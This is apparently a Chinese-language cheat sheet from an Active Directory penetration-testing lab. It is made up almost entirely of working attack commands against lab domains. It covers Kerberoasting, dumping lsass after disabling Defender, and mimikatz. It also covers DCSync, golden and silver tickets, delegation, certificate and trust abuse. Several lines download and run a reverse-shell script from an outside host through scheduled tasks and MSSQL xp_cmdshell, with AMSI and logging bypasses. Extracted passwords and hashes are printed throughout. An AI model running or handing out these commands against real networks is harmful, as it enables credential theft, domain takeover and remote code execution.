# Find-InterestingDomainAcl(pv)

用户
```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match "studentuser138"}
```

组
```
Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match 'managers'}
```

域
```
Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
```

# 枚举对某个用户组的ACL(pv)

```
 Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```


# 横向

使用winrs命令横向
```
PS C:\ad\Tools> winrs -r:us-mgmt cmd
```

用powershell直接横向
```
PS C:\ad\Tools>$usmgmt = New-PSSession us-mgmt
PS C:\ad\Tools> Enter-PSSession $usmgmt
```

# kerberoast
请求
```
Rubeus.exe kerberoast /user:appsvc /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

破解
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

# 设置SPN

前提：对目标用户有GenericAll权限

AD
```
Set-ADUser -Identity Support132User -ServicePrincipalNames @{Add='us/myspn132'} -Verbose
```

pv
```
Set-DomainObject -Identity Support132User -Set @{serviceprincipalname='us/myspn132'} -Verbose
```

查看SPN(ad)
```
Get-ADUser -Identity Support132User -Properties ServicePrincipalName | select ServicePrincipalName
```

Kerberoast 这个spn

```
Rubeus.exe kerberoast /user:Support132User /simple /rc4opsec /outfile:C:\AD\Tools\targetedhashes.txt
```

# LAPS

## 查看对哪台机器有LAPS
```
C:\AD\Tools\Get-LapsPermissions.ps1
```

也可以使用powerview
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

## 读取密码

1. 使用ActiveDirectory module读取密码
```
Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
```

2. 使用LAPS module
引入AdmPwd
```
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
```

```
Get-AdmPwdPassword -ComputerName us-mailmgmt
```

3. 使用pv
```
Get-DomainObject -Identity us-mailmgmt | select -ExpandProperty ms-mcs-admpwd
```

# gMSAs

枚举（AD），枚举哪些账号的密码可以被gMSA读取，假设是jumpone
```
Get-ADServiceAccount -Filter *
```

枚举有哪些gMSA可以读取指定账号（上面枚举出来的用户）的密码
```
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword
```

在gMSA的上下文中读取jumpone的哈希(AD)
```
PS C:\Windows\system32> $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
PS C:\Windows\system32> Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
PS C:\Windows\system32> $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
PS C:\Windows\system32> ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
24ea295f3c05aefc8c29d07992cdcc4c
PS C:\Windows\system32>
```

# WDAC

检测WDAC
```
PS C:\Users\jumpone$> Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard


AvailableSecurityProperties                  : {1, 2, 3, 5}
CodeIntegrityPolicyEnforcementStatus         : 2     //注意这里
InstanceIdentifier                           : 4ff40742-2649-41b8-bdd1-e80fad1cce80
RequiredSecurityProperties                   : {0}
SecurityServicesConfigured                   : {0}
SecurityServicesRunning                      : {0}
UsermodeCodeIntegrityPolicyEnforcementStatus : 2    //注意这里
Version                                      : 1.0
VirtualizationBasedSecurityStatus            : 0
VirtualMachineIsolation                      : False
VirtualMachineIsolationProperties            : {0}
PSComputerName                               :
```

表明WDAC 在靶机上运行，这就是powershell处于CLM下的原因

这当前环境下，大多数进攻性的powershell脚本（包括Invoke-mimikatz）不能使用

## 离线dump出lsass里的哈希

这里使用另一种方法dump出靶机上的哈希

首先离线存储lsass.exe里的数据

查看lsass的PID
```
PS C:\Users\jumpone$> tasklist /FI "IMAGENAME eq lsass.exe"
tasklist /FI "IMAGENAME eq lsass.exe"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
lsass.exe                      704 Services                   0     17,992 K
```

PID:704

先关闭wd
```
Set-MpPreference -DisableRealtimeMonitoring $true
```


转存lsass的数据到本地

```
C:\Users\jumpone$>rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 704 C:\Users\Public\lsass.dmp full
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 704 C:\Users\Public\lsass.dmp full

C:\Users\jumpone$>dir C:\Users\Public\lsass.dmp
dir C:\Users\Public\lsass.dmp
 Volume in drive C has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of C:\Users\Public

11/01/2022  07:38 AM        47,301,370 lsass.dmp
               1 File(s)     47,301,370 bytes
               0 Dir(s)  16,105,525,248 bytes free
```

已存储到```C:\Users\Public\lsass.dmp```


## mimikatz根据离线文件dump出哈希

```
c:\AD\Tools\mimikatz_trunk\x64>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jan  4 2020 18:59:26
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # sekurlsa::minidump C:\AD\Tools\lsass.DMP
Switch to MINIDUMP : 'C:\AD\Tools\lsass.DMP'

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::ekeys
```

# dump出证书
```
C:\Users\Public\RunWithRegistryNonAdmin.bat
```

下面路径查看本地的证书

```
ls cert:\LocalMachine\My
```

导出证书
```
ls cert:\LocalMachine\My\BAD78F43BB4CB13C4843E49B51AA051530FFBBDB | Export-PfxCertificate -FilePath C:\Users\Public\pawadmin.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
```

# 无约束委派计算机

pv
```
Get-DomainComputer -Unconstrained
```

ad
```
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

# 约束委派用户

pv
```
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
```

# 约束委派机器
pv
```
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

# 约束委派对象（机器和用户）
ad
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```


# 监听流量认证(当Unconstrained时)
```
Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap
```

# 强制流量认证(当Unconstrained时)
```
MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

# Dcsync
```
SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
```

# OverPass-The-Hash
```
SafetyKatz.exe "sekurlsa::pth /user:webmaster /domain:us.techcorp.local /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /run:cmd.exe" "exit"
```

# PTT
```
Rubeus.exe s4u /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
```

# 金票
BetterSafetyKatz.exe
```
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

powershell
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /aes256:5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

# 银票

```
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /target:us-dc.us.techcorp.local /service:HOST /aes256:36e55da5048fa45492fc7af6cb08dbbc8ac22d91c697e2b6b9b8c67b9ad1e0bb /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

当创建好银票后，定时任务返回revshell
```
PS C:\Windows\system32> schtasks /create /S us-dc.us.techcorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User138" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.138/Invoke-PowerShellTcpEx.ps1''')'"
```

触发定时任务

```
schtasks /Run /S us-dc.us.techcorp.local /TN "User138"
```

# 枚举当前账号是否有dcsync权限

pv
```
 Get-DomainObjectAcl -SearchBase "dc=us,dc=techcorp,dc=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser138"}
```

# 设置DCsync权限
pv
```
Set-ADACL -DistinguishedName 'DC=us,DC=techcorp,DC=local' -SamAccountName studentuser138 -GUIDRight DCSync -Verbose
```

# CS证书枚举

```
Certify.exe cas

Certify.exe find

Certify.exe find /enrolleeSuppliesSubject    #这里的结果表示谁可以创建模板证书
```

## 根据证书申请tgt
```
Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
```

## 为DA申请一个模板证书（后续可以根据整个证书申请DA的tgt，参考上面）
```
Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
```

## pem转成pfx文件
```
openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
```

# Azure AD

AD
枚举安装 Azure AD Connect 的机器(名称以 MSOL_ 开头的特殊帐户)
```
PS C:\Windows\system32> Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName,Description | fl
```

## 使用adconnect.ps1拿到明文密码

远程加载

```
PS C:\Users\helpdeskadmin\Downloads> iex (New-Object Net.WebClient).DownloadString('http://192.168.100.138/adconnect.ps1')
```

执行命令，拿到明文密码
```
PS C:\Users\helpdeskadmin\Downloads> ADconnect
ADconnect
AD Connect Sync Credential Extract POC (@_xpn_)

AD Connect Sync Credential Extract v2 (@_xpn_)
        [ Updated to support new cryptokey storage method ]

[*] Querying ADSync localdb (mms_server_configuration)
[*] Querying ADSync localdb (mms_management_agent)
[*] Using xp_cmdshell to run some Powershell as the service user
[*] Credentials incoming...

Domain: techcorp.local
Username: MSOL_16fb75d0227d
Password: 70&n1{p!Mb7K.C)/USO.a{@m*%.+^230@KAc[+sr}iF>Xv{1!{=/}}3B.T8IW-{)^Wj^zbyOc=Ahi]n=S7K$wAr;sOlb7IFh}!%J.o0}?zQ8]fp&.5w+!!IaRSD@qYf

```

## 根据ADconnect的明文密码，执行dcsync

1. 使用明文密码获取这个用户的一个shell（教材说这一步不需要在高完整性的admin shell中进行）

```
C:\Windows\system32>runas /user:techcorp.local\MSOL_16fb75d0227d /netonly cmd
Enter the password for techcorp.local\MSOL_16fb75d0227d:
Attempting to start cmd as user "techcorp.local\MSOL_16fb75d0227d" ...

```

2. 在新打开的cmd中，使用dcsync拿到techcorp\administrator的哈希
```
SafetyKatz.exe "lsadump::dcsync /user:techcorp\administrator /domain:techcorp.local" "exit"
```


# 域信任滥用

## 子域到父域（Administrator身份）

需要两步，

1. 请求一个Administrator的tgt
```
BetterSafetyKatz.exe "kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:007d02edc39e9e8874a0c6dc373b8d46 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```

2. 根据上面tgt请求一个到父域cifs服务的tgs

```
Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt
```

## 子域到父域（krbtgt身份）

只需要1步
```
BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:us.techcorp.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:b0975ae49f441adc6b024ad238935af5 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"
```


## 访问外域（SPN，约束委派）

枚举spn(AD)
```
Get-ADTrust -Filter 'IntraForest -ne $true' | %{Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName -Server $_.Name}
```

如果这个spn属于外域，请求tgs
```
Rubeus.exe kerberoast /user:storagesvc /simple /domain:eu.local /outfile:C:\AD\Tools\euhashes.txt
```

爆破上面的tgs,得到明文密码
```
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\euhashes.txt
```

明文密码转成哈希
```
Rubeus.exe hash /password:Qwerty@123 /user:storagesvc /domain:eu.local
```

约束委派对象（机器和用户）
ad
```
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

假设本来委派的只是一个time/EU-DC.eu.local/eu.local服务，但是因为tgs中的服务名不受保护，可修改，这里另外申请了一个ldap服务

s4u
```
Rubeus.exe s4u /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
```

执行dcsync，拿到外域用户哈希

```
SharpKatz.exe --Command dcsync --User eu\krbtgt --Domain eu.local --DomainController eu-dc.eu.local
```

## 访问外域（无约束委派）

前提是双向信任

在无约束委派机器开启监听
```
Rubeus.exe monitor /targetuser:usvendor-dc$ /interval:5 /nowrap
```

强制外域DC向本域约束委派机器认证
```
MS-RPRN.exe \\usvendor-dc.usvendor.local \\us-web.us.techcorp.local
```


##  枚举所有SID>1000的组

AD
```
Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server euvendor.local
```


# MSSQL

使用PowerupSQL.psd1

## 举当前账号是否有任何可用的mssql链接
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

## 检查当前账号是否有权限进入mssql
```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded 
```

## 查看指定链接的信息
```
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
```

## 自动爬取数据库链接
```
Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
```

## 对指定链接执行系统命令
```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
```

## 执行系统命令，返回一个rev shell

简单版本
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1'')"'
```

绕过AMSI
```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcpEx.ps1)"'''
```

指定在db-sqlsrv上操作
```
Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
```


## 启用RPC OUT和xp_cmdshell

```
Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"

Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"

Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""

Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
```


## 在HeidiSQL客户端操作

找当前链接下的链接
```
select * from master..sysservers
```

枚举指定链接下面的连接
```
select * from openquery("192.168.23.25",'select * from master..sysservers')
```

 嵌套链接，执行sql语句
```
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')
```

获取一个rev shell
```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell ''''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcp.ps1)"'''''')')
```

# FSPs 

枚举FSPs 
```
Find-ForeignGroup -Verbose
```

根据上面得出的SID获取用户名等详细信息
```
Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-10608'}
```

横向
```
winrs -r:db-dc.db.local -u:dbvendor\db138svc -p:Password@123 "whoami"
```

# PAM信任，跨林攻击

枚举FSPs，使用AD
```
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local
```

根据上面枚举的SID，查看详细组信息
```
Get-ADGroup -Filter * -Properties Member -Server bastion.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
```

检查是否启用了 PAM 信任(AD)
```
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```